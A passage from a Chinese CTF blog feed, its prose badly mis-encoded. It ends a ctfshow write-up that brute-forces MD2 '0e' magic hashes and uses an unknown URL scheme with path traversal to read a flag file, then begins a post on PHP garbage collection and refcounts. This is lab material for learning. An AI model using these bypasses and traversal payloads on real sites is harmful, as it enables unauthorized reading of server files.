<p><code>$d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c)));</code><br>æœ‰ä¸ªrobots.txtæ–‡ä»¶</p>
<p><img src="https://img-blog.csdnimg.cn/e78bc410ddb4452f9a789038554b8fc3.png" alt="1"><br>åªè¦ä¿è¯ä¸€ä¸ªæ•°å‰é¢åŠ ä¸Š0eä¹‹åå†md2ä»ç„¶æ˜¯0eå¼€å¤´çš„æ•°å­—å³å¯</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">999999</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'0e'</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">'024452'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string single-quoted-string">'0e'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'$i = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'$b = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token variable">$c</span><span class="token operator">=</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'0e'</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">'48399'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string single-quoted-string">'0e'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'$i = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'$c = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿è¡Œå¾—åˆ°ç»“æœ<br><img src="https://img-blog.csdnimg.cn/24773c08bf7943759760909a91edf091.png" alt="2">b&#x3D;0e652024452&amp;c&#x3D;0e603448399</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
             <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token variable">$host</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow\.com$/'</span><span class="token punctuation">,</span><span class="token variable">$host</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'å·®ç‚¹ç‚¹å°±æˆåŠŸäº†ï¼'</span><span class="token punctuation">;</span>
                <span class="token punctuation">&#125;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'please give me url!!!'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>filter_varå‡½æ•°ï¼š</p>
<blockquote>
<p>filter_var() å‡½æ•°é€šè¿‡æŒ‡å®šçš„è¿‡æ»¤å™¨è¿‡æ»¤ä¸€ä¸ªå˜é‡ã€‚</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"someone@example....com"</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_EMAIL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"E-mail is not valid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"E-mail is valid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ä»£ç çš„è¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<blockquote>
<p>E-mail is not valid </p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/c283211f432e4879a0d9d4b1c9c5f153.png" alt="1"><a href="https://www.runoob.com/php/php-ref-filter.html">è¯¦æƒ…è¯·è§</a></p>
<p>phpä¼šå°†ä¸è®¤è¯†çš„åè®®å½“æˆç›®å½•</p>
<blockquote>
<p>url&#x3D;hhh:&#x2F;&#x2F;ctfshow.com&#x2F;<br>æ‰“å°Array ( [scheme] &#x3D;&gt; hhh [host] &#x3D;&gt; ctfshow.com [path] &#x3D;&gt; &#x2F; )<br>url&#x3D;hhh:&#x2F;&#x2F;ctfshow.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt<br>æ‰“å°Array ( [scheme] &#x3D;&gt; hhh [host] &#x3D;&gt; ctfshow.com [path] &#x3D;&gt; &#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt ) ctfshow{91873400-0885-4a10-a7d9-75c9568f5e86} </p>
</blockquote>
]]></content>
      <categories>
        <category>çŸ¥è¯†ç‚¹</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>phpçš„åƒåœ¾å›æ”¶(GC)æœºåˆ¶ä»‹ç»ä»¥åŠåœ¨pharååºåˆ—åŒ–ä¸­çš„ä¸€äº›åˆ©ç”¨</title>
    <url>/2023/07/17/php%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6-GC-%E6%9C%BA%E5%88%B6%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E5%9C%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="phpçš„åƒåœ¾å›æ”¶-GC-æœºåˆ¶ä»‹ç»ä»¥åŠåœ¨pharååºåˆ—åŒ–ä¸­çš„ä¸€äº›åˆ©ç”¨"><a href="#phpçš„åƒåœ¾å›æ”¶-GC-æœºåˆ¶ä»‹ç»ä»¥åŠåœ¨pharååºåˆ—åŒ–ä¸­çš„ä¸€äº›åˆ©ç”¨" class="headerlink" title="phpçš„åƒåœ¾å›æ”¶(GC)æœºåˆ¶ä»‹ç»ä»¥åŠåœ¨pharååºåˆ—åŒ–ä¸­çš„ä¸€äº›åˆ©ç”¨"></a>phpçš„åƒåœ¾å›æ”¶(GC)æœºåˆ¶ä»‹ç»ä»¥åŠåœ¨pharååºåˆ—åŒ–ä¸­çš„ä¸€äº›åˆ©ç”¨</h2><h2 id="ææ„å‡½æ•°-destruct"><a href="#ææ„å‡½æ•°-destruct" class="headerlink" title="ææ„å‡½æ•°__destruct()"></a>ææ„å‡½æ•°__destruct()</h2><p>å½“ä¸€ä¸ªç¨‹åºç»“æŸåphpä¼šè‡ªåŠ¨é”€æ¯ï¼Œæœ€åå†è°ƒç”¨ä¸€æ¬¡<code>__destruct()</code>ã€‚ä¹Ÿå°±æ˜¯è¯´åˆ›å»ºäº†ä¸€ä¸ªå¯¹è±¡çš„è¯ï¼Œç¨‹åºç»“æŸåå°±ä¼šè¢«é”€æ¯ï¼Œåœ¨ç»“æŸæ—¶ä¼šè°ƒç”¨ä¸€æ¬¡ä»¥ä¸Š<code>__destruct()</code>ã€‚å¦‚æœè¦è§¦å‘<code>__destruct()</code>çš„è¯ï¼Œè¦ä¹ˆå¯¹è±¡ä¸º<code>null</code>,è¦ä¹ˆphpçš„ç”Ÿå‘½å‘¨æœŸç»“æŸï¼Œè¦ä¹ˆç»™å®šçš„å˜é‡è¢«unset()é”€æ¯ã€‚é‚£ä¹ˆå¦‚æœç¨‹åºè¿˜æ²¡æœ‰è¿è¡Œç»“æŸçš„è¯ï¼Œåœ¨è¿è¡Œä¸­æŠ›å‡ºå¼‚å¸¸æˆ–è€…ç¨‹åºæŠ¥é”™åˆ™ä¸ä¼šè§¦å‘<code>__destruct()</code>ï¼Œè¿™é‡Œå°±è¦æåˆ°GCå›æ”¶æœºåˆ¶ã€‚</p>
<h2 id="GCæœºåˆ¶å®˜æ–¹æ–‡æ¡£"><a href="#GCæœºåˆ¶å®˜æ–¹æ–‡æ¡£" class="headerlink" title="GCæœºåˆ¶å®˜æ–¹æ–‡æ¡£"></a>GCæœºåˆ¶<a href="https://www.php.net/manual/zh/features.gc.php">å®˜æ–¹æ–‡æ¡£</a></h2><p>ä¹Ÿå°±æ˜¯åƒåœ¾å›æ”¶æœºåˆ¶ï¼Œåœ¨phpï¼Œpythonï¼Œjavaï¼Œc# ç­‰ä¸­éƒ½æœ‰å­˜åœ¨ã€‚</p>
<p>GCæœºåˆ¶ï¼Œèƒ½å¤Ÿé”€æ¯å†…å­˜ç©ºé—´ï¼Œé˜²æ­¢å†…å­˜æº¢å‡ºï¼Œåœ¨PHPä¸­ä½¿ç”¨<strong>å¼•ç”¨è®¡æ•°</strong>å’Œ<strong>å›æ”¶å‘¨æœŸ</strong>æ¥è‡ªåŠ¨ç®¡ç†å†…å­˜å¯¹è±¡ï¼Œå½“ä¸€ä¸ªå˜é‡è¢«è®¾ç½®ä¸ºNULLæˆ–è€…æ²¡æœ‰æŒ‡é’ˆæŒ‡å‘æ—¶å®ƒå°±ä¼šå˜æˆåƒåœ¾è¢«GCæœºåˆ¶è‡ªåŠ¨å›æ”¶æ‰ï¼›å½“å¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨æ—¶ï¼Œä¹Ÿä¼šè¢«å›æ”¶ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨å¯¹è±¡ä¸­çš„<code>__destruct()</code>ã€‚</p>
<h3 id="å¼•ç”¨è®¡æ•°"><a href="#å¼•ç”¨è®¡æ•°" class="headerlink" title="å¼•ç”¨è®¡æ•°"></a>å¼•ç”¨è®¡æ•°</h3><p>æ¯ä¸€ä¸ªphpå˜é‡å­˜åœ¨ä¸€ä¸ªå«åšzvalçš„å˜é‡å®¹å™¨ï¼Œä¸€ä¸ªzvalå˜é‡å®¹å™¨åŒ…å«å˜é‡çš„ç±»å‹å’Œå€¼ï¼Œè¿˜åŒ…æ‹¬ä¸¤ä¸ªå­—èŠ‚çš„é¢å¤–ä¿¡æ¯â€”<code>is_ref</code>å’Œ<code>refcount</code>ã€‚</p>
<p><code>is_ref</code>æ˜¯ä¸ªboolå€¼ï¼Œç”¨æ¥æ ‡è¯†å˜é‡æ˜¯å¦æ˜¯å¼•ç”¨é›†åˆï¼Œé€šè¿‡è¿™ä¸ªå­—èŠ‚ï¼Œphpå¼•æ“æ‰å¯ä»¥æŠŠæ™®é€šå˜é‡å’Œå¼•ç”¨å˜é‡åŒºåˆ†å¼€æ¥ã€‚phpå®ƒå…è®¸ç”¨æˆ·é€šè¿‡<code>&amp;</code>æ¥è‡ªå®šä¹‰å¼•ç”¨ï¼Œå¹¶ä¸”zvalå˜é‡å®¹å™¨ä¸­è¿˜æœ‰ä¸€ä¸ªå†…éƒ¨å¼•ç”¨è®¡æ•°æœºåˆ¶ç”¨æ¥ä¼˜åŒ–å†…å­˜çš„ä½¿ç”¨ã€‚</p>
<p><code>refcount</code>è¡¨ç¤ºæœ‰å¤šå°‘ä¸ªå˜é‡åæŒ‡å‘zvalå®¹å™¨ï¼Œä¹Ÿå°±æ˜¯æŒ‡å‘è¿™ä¸ªzvalå˜é‡å®¹å™¨çš„å˜é‡ä¸ªæ•°ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨xdebugæ¥æ£€æŸ¥å¼•ç”¨è®¡æ•°çš„æƒ…å†µ<br> <img src="https://img-blog.csdnimg.cn/32b4413f344d4a71bbdaed0f95532c0b.png" alt="1"></p>
<p>å¼•ç”¨ä¾‹å­ï¼š</p>
<p>åœ¨php5.6.9ä¸‹è¿è¡Œ</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"new string"</span><span class="token punctuation">;</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">unset</span><span class="token punctuation">(</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//é”€æ¯$b,$cå˜é‡</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment">//å¼•ç”¨å˜é‡</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨php5.6.9ä¸‹è¿è¡Œå¾—åˆ°ç»“æœ</p>
<blockquote>
<p>a: (refcount&#x3D;3, is_ref&#x3D;0)&#x3D;â€˜new stringâ€™<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;â€˜new stringâ€™&#x2F;&#x2F;b,b,cè¢«é”€æ¯åå°±å‰©ä¸€ä¸ªaæŒ‡å‘zvalå®¹å™¨a:(refcount&#x3D;2,isref&#x3D;1)&#x3D;â€²newstringâ€²&#x2F;&#x2F;aæŒ‡å‘zvalå®¹å™¨a:(refcount&#x3D;2,isrâ€‹ef&#x3D;1)&#x3D;â€²newstringâ€²&#x2F;&#x2F;bå¼•ç”¨äº†açš„åœ°å€ï¼Œé‚£ä¹ˆaçš„åœ°å€ï¼Œé‚£ä¹ˆbå°±æ˜¯å¼•ç”¨å˜é‡</p>
</blockquote>
<p>åœ¨php7.3.4ä¸‹è¿è¡Œå¾—åˆ°ç»“æœ</p>
<blockquote>
<p>a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;â€˜new stringâ€™<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;â€˜new stringâ€™<br> a: (refcount&#x3D;2, is_ref&#x3D;1)&#x3D;â€˜new stringâ€™&#x2F;&#x2F;bå¼•ç”¨äº†bå¼•ç”¨äº†açš„åœ°å€ï¼Œé‚£ä¹ˆ$bå°±æ˜¯å¼•ç”¨å˜é‡</p>
</blockquote>
<p>æ³¨æ„ï¼š</p>
<p>åœ¨php7å¼€å§‹ï¼Œ$c &#x3D; $b &#x3D; $aä¹‹åaçš„å¼•ç”¨å˜é‡ä¹Ÿæ˜¯1ã€‚</p>
<p>åœ¨PHP 7ä¸­ï¼Œzvalå¯ä»¥è¢«å¼•ç”¨è®¡æ•°æˆ–ä¸è¢«å¼•ç”¨ï¼Œåœ¨zvalç»“æ„ä¸­æœ‰ä¸€ä¸ªæ ‡å¿—ç¡®å®šäº†è¿™ä¸€ç‚¹ã€‚</p>
<p>â‘ å¯¹äºnullï¼Œboolï¼Œintå’Œdoubleçš„ç±»å‹å˜é‡ï¼Œrefcountä¸ä¼šè®¡æ•°ï¼›</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'b'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'c'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">=</span><span class="token number">1.1</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'d'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>php7.3.4è¿è¡Œç»“æœï¼š</p>
<blockquote>
<p>a: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;NULL<br> b: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;TRUE<br> c: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;1<br> d: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;1.1</p>
<p>refcountå€¼éƒ½ä¸º0</p>
</blockquote>
<p>php5.6.9è¿è¡Œç»“æœ</p>
<blockquote>
<p>a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;NULL<br> b: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;TRUE<br> c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;1<br> d: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;1.1</p>
<p>refcountå€¼éƒ½ä¸º1</p>
</blockquote>
<p>â‘¡å¯¹äºå¯¹è±¡ï¼Œrefcountè®¡æ•°å’Œphp5çš„<strong>ä¸€è‡´</strong>ï¼›</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">sd</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$s</span><span class="token operator">=</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">sd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>php7.3.4è¿è¡Œç»“æœï¼š</p>
<blockquote>
<p>a: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;class sd { public $s &#x3D; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;â€˜1â€™ }</p>
</blockquote>
<p>php5.6.9è¿è¡Œç»“æœï¼š</p>
<blockquote>
<p>a: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;class sd { public $s &#x3D; (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;â€˜1â€™ }</p>
<p>å¯ä»¥å‘ç°ï¼Œä¸¤ä¸ªrefcountç»“æœä¸€æ ·</p>
</blockquote>
<p>â‘¢å¯¹äºå­—ç¬¦ä¸²;</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"new string"</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">unset</span><span class="token punctuation">(</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>php7.3.4è¿è¡Œç»“æœï¼š</p>
<blockquote>
<p>a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;â€˜new stringâ€™<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;â€˜new stringâ€™<br> a: (refcount&#x3D;2, is_ref&#x3D;1)&#x3D;â€˜new stringâ€™</p>
</blockquote>
<p>php5.6.9è¿è¡Œç»“æœï¼š</p>
<blockquote>
<p>a: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;â€˜new stringâ€™<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;â€˜new stringâ€™<br> a: (refcount&#x3D;2, is_ref&#x3D;1)&#x3D;â€˜new stringâ€™</p>
</blockquote>
<p>â‘£å¯¹äºæ•°ç»„ï¼Œæœªå¼•ç”¨çš„å˜é‡è¢«ç§°ä¸ºâ€œä¸å¯å˜æ•°ç»„â€ã€‚å…¶æ•°ç»„æœ¬èº«è®¡æ•°ä¸php5ä¸€è‡´ï¼Œä½†æ˜¯æ•°ç»„é‡Œé¢çš„æ¯ä¸ªé”®å€¼å¯¹çš„è®¡æ•°ï¼Œåˆ™æŒ‰å‰é¢ä¸‰æ¡çš„è§„åˆ™ï¼›</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'c'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$d</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">;</span><span class="token comment">//æ•°ç»„å€¼æ”¹å˜ä»¥åï¼Œä¹‹å‰çš„å¼•ç”¨å…¨éƒ¨åºŸå¼ƒï¼Œé‡æ–°è®¡ç®—</span>
<span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'c'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>php7.3.4è¿è¡Œç»“æœï¼š</p>
<blockquote>
<p>c: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;â€˜aâ€™, 1 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;â€˜bâ€™)<br> c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;â€˜aâ€™, 1  &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;â€˜bâ€™, 2 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;â€˜câ€™)</p>
</blockquote>
<p>php5.6.9è¿è¡Œç»“æœï¼š</p>
<blockquote>
<p>c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;â€˜aâ€™, 1 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;â€˜bâ€™)<br> c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;â€˜aâ€™, 1  &#x3D;&gt; (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;â€˜bâ€™, 2 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;â€˜câ€™)</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/22e913ea4a704047b26b0700fbfbafba.png" alt="1"></p>
